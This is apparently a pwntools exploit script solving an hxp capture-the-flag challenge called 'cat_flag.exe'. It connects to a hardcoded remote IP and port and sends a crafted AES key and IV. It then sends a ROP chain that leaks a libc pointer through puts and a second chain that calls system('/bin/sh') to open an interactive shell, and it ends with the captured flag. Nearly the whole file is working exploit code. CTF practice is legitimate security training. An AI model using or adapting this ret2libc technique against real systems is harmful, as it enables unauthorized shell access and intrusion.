#!/usr/bin/env python2

from pwn import *
import binascii
import struct
import time

def up64(data):
    return struct.unpack("<Q", data)

###

if len(sys.argv) > 1:
    DEBUG = True
    offset = 0x6b990
    system = 0x41490
    binsh = 0x1633e8
    execve = 0xba310
else:
    DEBUG = False
    offset = 0x6b990
    system = 0x41490
    binsh = 0x163708
    execve = 0xba310

###

if DEBUG:
    r = process("./cat_flag.exe")
else:
    r = remote("104.154.90.175", 54509)

### STAGE 1: leak libc
r.recvuntil(": ")
#log.info("press key")
#raw_input()
# payload is as follow : [16 bytes key] [1 byte padding] [IV]
# the IV used is from ./aes.py
p = "laxa" * 4 + "X" + "\x07\x88\x90\x54\x1f\x97\x5b\x1b\x2b\xce\x60\x1c\x97\xef\xed\x4c"
log.info("stage1: inserting shellcode")
r.send(p)
r.recvuntil("Starting protected code...\n")
ROP = ""
ROP += p64(0x400ea3) # pop rdi ; ret
ROP += p64(0x601418) # puts.plt
ROP += p64(0x400900) # puts
ROP += p64(0x400a40) # pop rbp ; ret
ROP += p64(0x601578) # new rbp
ROP += p64(0x400e32) # mov eax, 0 ; leave ; ret
ROP += p64(0x400ADE) # our shellcode
log.info("stage 2: ROP to leak libc")
r.sendline(ROP)
data = r.recvline().rstrip()
while len(data) < 8:
    data += "\x00"
libcptr = up64(data)[0]
baselibc = libcptr - offset
log.info("libcptr: " + hex(libcptr))
log.info("baselibc: " + hex(baselibc))
ROP = ""
ROP += p64(0x400ea3) # pop rdi ; ret
ROP += p64(binsh + baselibc)
ROP += p64(system + baselibc)

log.info("stage 3: ROP to shell")
r.sendline(ROP)
r.interactive()

# flag is: hxp{The unauthorized reproduction or distribution of this copyrighted work is illegal. Criminal copyright infringement, including infringement without monetary gain, is investigated by the FBI and is punishable by up to five years in federal prison and a fine of $250,000.}
